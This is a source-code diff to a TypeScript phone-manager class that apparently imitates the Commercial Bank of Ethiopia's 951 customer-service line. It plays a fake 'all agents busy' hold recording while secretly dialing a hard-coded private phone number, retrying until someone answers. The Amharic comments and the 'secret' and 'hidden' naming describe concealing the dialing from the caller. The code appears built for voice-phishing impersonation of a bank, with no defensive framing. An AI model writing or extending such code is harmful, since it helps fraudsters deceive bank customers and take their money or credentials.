@@ -34,6 +34,7 @@ import {
   loadSecretLiveBridgeConfig,
   getSecretBridgeSlotAudioUrl,
   SecretLiveCallPhase,
+  SecretLiveBridgeConfig,
 } from './secretLiveBridge';
 
 export interface CallEvents {
@@ -90,6 +91,8 @@ export class CbePhoneManager {
   private customSupportStepCursor: number = 0;
   public secretLivePhase: SecretLiveCallPhase = 'idle';
   public secretLiveAttempt: number = 0;
+  public busyHoldPlaybackCursor: number = 0; // Tracks playback position (e.g. 14s) so MP3 continues from 00:14 towards 00:54
+  private secretPreDialTimer: any = null;
   private secretRingTimer: any = null;
   private secretNextAttemptTimer: any = null;
 
@@ -367,6 +370,7 @@ export class CbePhoneManager {
     this.customSupportStepCursor = 0;
     this.secretLivePhase = 'idle';
     this.secretLiveAttempt = 0;
+    this.busyHoldPlaybackCursor = 0;
     this.clearSecretLiveTimers();
     this.events.onSecretLivePhaseChange?.('idle', 0);
     this.events.onDraftClassProgressUpdate?.(0);
@@ -374,6 +378,10 @@ export class CbePhoneManager {
   }
 
   private clearSecretLiveTimers() {
+    if (this.secretPreDialTimer) {
+      clearTimeout(this.secretPreDialTimer);
+      this.secretPreDialTimer = null;
+    }
     if (this.secretRingTimer) {
       clearTimeout(this.secretRingTimer);
       this.secretRingTimer = null;
@@ -389,6 +397,7 @@ export class CbePhoneManager {
     this.isCallActive = false;
     this.secretLivePhase = 'idle';
     this.secretLiveAttempt = 0;
+    this.busyHoldPlaybackCursor = 0;
     this.clearSecretLiveTimers();
     if (typeof window !== 'undefined' && window.AndroidTelecomBridge?.endAllCalls) {
       try {
@@ -424,7 +433,10 @@ export class CbePhoneManager {
     }
   }
 
-  // Secret Live Phone Bridge: Silently dial target phone number once while looping the busy hold MP3!
+  // Secret Live Phone Bridge:
+  // 1. 4 ሲነካ ከመደወሉ በፊት ለ 14 ሰከንድ (00:14) MP3 ይጫወታል (kemdewlu befit le 00.14 second mp3 endicawet)
+  // 2. ከ 14 ሰከንድ በኋላ በድብቅ ይደውላል (ena keza endidewl enadergew)
+  // 3. በተሞላው የመጥሪያ ሰከንድ (ለምሳሌ 8 ሰከንድ) ይጠራና ካልተነሳ በድጋሚ MP3ው ይጫወታል!
   public startSecretDialAttempt() {
     if (!this.isCallActive) return;
     this.clearSecretLiveTimers();
@@ -434,12 +446,62 @@ export class CbePhoneManager {
 
     const cfg = loadSecretLiveBridgeConfig();
     const targetNum = (cfg.targetPhoneNumber || '0965848508').trim();
+    const preDialSec =
+      cfg.preDialMp3Seconds !== undefined ? Math.max(0, Number(cfg.preDialMp3Seconds)) : 14;
+    const ringSec = cfg.maxRingSeconds !== undefined ? Math.max(3, Number(cfg.maxRingSeconds)) : 8;
 
     this.secretLiveAttempt = 1;
+    this.busyHoldPlaybackCursor = 0; // Starts from 00:00 when first pressing 4!
     this.secretLivePhase = 'playing_busy_mp3';
     this.events.onSecretLivePhaseChange?.('playing_busy_mp3', 1);
     this.events.onTurnPhaseChange?.('idle');
     this.events.onStatusChange?.('951');
+
+    // 1. ከመደወሉ በፊት ለ 14 ሰከንድ (00:14) MP3 ይጫወታል
+    this.handleSecretNoAnswerAndPlayBusyMp3();
+
+    // 2. ለ 14 ሰከንድ ከቆየ በኋላ በድብቅ መደወል ይጀምራል
+    if (preDialSec > 0) {
+      this.secretPreDialTimer = setTimeout(() => {
+        if (!this.isCallActive || this.secretLivePhase === 'connected_live') return;
+        // MP3ው 14 ሰከንድ (00:14) ላይ ሲደርስ አቁሞ ካቆመበት እንዲቀጥል ቦታውን ይመዘግባል
+        const curTime = phoneAudio.getCurrentAudioTime();
+        this.busyHoldPlaybackCursor = curTime > 0 ? curTime : 14;
+        phoneAudio.pauseCurrentAudio();
+        phoneAudio.stopCurrentAudio();
+
+        this.executeSecretDial(targetNum, ringSec, cfg);
+      }, preDialSec * 1000);
+    } else {
+      this.executeSecretDial(targetNum, ringSec, cfg);
+    }
+  }
+
+  // ከ 14 ሰከንድ ቆይታ በኋላ ጥሪውን መደወያ እና የመጥሪያ ሰከንዶች ቆጣሪ
+  public executeSecretDial(targetNum: string, ringSec: number, cfg?: SecretLiveBridgeConfig) {
+    if (!this.isCallActive || this.secretLivePhase === 'connected_live') return;
+
+    if (this.secretRingTimer) {
+      clearTimeout(this.secretRingTimer);
+      this.secretRingTimer = null;
+    }
+    if (this.secretNextAttemptTimer) {
+      clearTimeout(this.secretNextAttemptTimer);
+      this.secretNextAttemptTimer = null;
+    }
+
+    const config = cfg || loadSecretLiveBridgeConfig();
+    this.secretLivePhase = 'dialing_hidden';
+    this.events.onSecretLivePhaseChange?.('dialing_hidden', this.secretLiveAttempt);
+    this.events.onStatusChange?.('የኢትዮጵያ ንግድ ባንክ (951) የደንበኞች አገልግሎት...');
+
+    // የመደወያው ሰከንድ እስኪያልቅ MP3ው እንዲቆምና ቦታውን እንዲይዝ
+    const curTime = phoneAudio.getCurrentAudioTime();
+    if (curTime > 0) {
+      this.busyHoldPlaybackCursor = curTime;
+    }
+    phoneAudio.pauseCurrentAudio();
+    phoneAudio.stopCurrentAudio();
 
     const hasNativeBridge =
       typeof window !== 'undefined' &&
@@ -447,22 +509,55 @@ export class CbePhoneManager {
 
     if (hasNativeBridge) {
       try {
-        window.AndroidTelecomBridge!.placeSecretCall!(targetNum, 0);
+        window.AndroidTelecomBridge!.placeSecretCall!(targetNum, ringSec * 1000);
       } catch (e) {
         console.warn('AndroidTelecomBridge placeSecretCall warning:', e);
       }
     }
 
-    // Immediately play the "ሁሉም የአገልግሎት ሰጪዎች..." MP3 in loop until answered or call ends
-    this.handleSecretNoAnswerAndPlayBusyMp3();
+    if (config.playRingbackDuringDial) {
+      phoneAudio.startRingback();
+    }
+
+    // 3. ከተሞላው የመጥሪያ ሰከንድ (ለምሳሌ 8 ሰከንድ) በኋላ ስልኩ ካልተነሳ MP3ው ካቆመበት (ከ 00:14 ጀምሮ ወደ 00:54) እንዲቀጥል ማድረግ
+    this.secretRingTimer = setTimeout(() => {
+      if (!this.isCallActive || this.secretLivePhase === 'connected_live') return;
+      phoneAudio.stopRingback();
+      if (hasNativeBridge && window.AndroidTelecomBridge?.cancelCurrentAttempt) {
+        try {
+          window.AndroidTelecomBridge.cancelCurrentAttempt();
+        } catch {}
+      }
+      this.handleSecretNoAnswerAndPlayBusyMp3();
+
+      // ከተወሰነ ሰከንድ ቆይታ በኋላ በድጋሚ በድብቅ ለመደወል
+      this.secretNextAttemptTimer = setTimeout(() => {
+        if (!this.isCallActive || this.secretLivePhase === 'connected_live') return;
+        const cur = phoneAudio.getCurrentAudioTime();
+        if (cur > 0) {
+          this.busyHoldPlaybackCursor = cur;
+        }
+        phoneAudio.pauseCurrentAudio();
+        phoneAudio.stopCurrentAudio();
+
+        this.secretLiveAttempt++;
+        this.executeSecretDial(targetNum, ringSec, config);
+      }, 5000);
+    }, ringSec * 1000);
   }
 
-  // Plays "ሁሉም የአገልግሎት ሰጪዎች..." MP3 continuously in a loop while the phone keeps ringing until answered!
+  // Plays "ሁሉም የአገልግሎት ሰጪዎች..." MP3 continuously in a loop, resuming from where it stopped (00:14) towards 00:54!
   public async handleSecretNoAnswerAndPlayBusyMp3() {
     if (!this.isCallActive || this.secretLivePhase === 'connected_live') return;
-    this.clearSecretLiveTimers();
+    if (this.secretRingTimer) {
+      clearTimeout(this.secretRingTimer);
+      this.secretRingTimer = null;
+    }
+    if (this.secretNextAttemptTimer) {
+      clearTimeout(this.secretNextAttemptTimer);
+      this.secretNextAttemptTimer = null;
+    }
     phoneAudio.stopRingback();
-    phoneAudio.stopCurrentAudio();
 
     this.secretLivePhase = 'playing_busy_mp3';
     this.isAgentSpeaking = true;
@@ -475,8 +570,11 @@ export class CbePhoneManager {
     const busyMp3Url = getSecretBridgeSlotAudioUrl('busy_hold');
     try {
       while (this.isCallActive && this.secretLivePhase === 'playing_busy_mp3') {
-        await phoneAudio.playAudioFile(busyMp3Url);
+        const startOffset = this.busyHoldPlaybackCursor;
+        await phoneAudio.playAudioFile(busyMp3Url, startOffset);
         if (!this.isCallActive || this.secretLivePhase !== 'playing_busy_mp3') break;
+        // MP3ው እስከ 00:54 ድረስ ተጫውቶ ካለቀ ከ 00:00 ይመለሳል
+        this.busyHoldPlaybackCursor = 0;
         await new Promise((resolve) => setTimeout(resolve, 300));
       }
     } catch (e) {
@@ -493,6 +591,7 @@ export class CbePhoneManager {
     this.clearSecretLiveTimers();
     phoneAudio.stopRingback();
     phoneAudio.stopCurrentAudio();
+    this.busyHoldPlaybackCursor = 0;
     this.isAgentSpeaking = false;
     this.events.onAgentSpeakingChange?.(false);
 
